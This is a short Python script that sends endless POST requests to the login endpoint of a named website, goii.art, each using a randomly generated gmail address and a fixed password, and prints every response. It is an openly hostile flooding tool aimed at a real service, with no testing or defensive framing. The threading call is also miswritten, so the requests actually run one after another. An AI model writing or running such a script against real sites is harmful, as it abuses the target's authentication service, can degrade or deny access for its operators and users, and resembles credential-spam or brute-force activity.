import requests
import os
import random
import threading


def login():
    url = 'https://goii.art/api/v1/passport/auth/login'
    random_num = random.randint(1, 999999999999)
    random_email = "%d@gmail.com" % random_num
    data = {
        'email' : random_email,
        'password' : 123456789
    }

    r = requests.post(url,data)

    print(random_email,r)

while(True):
    t1 = threading.Thread(target=login())
    t1.start()


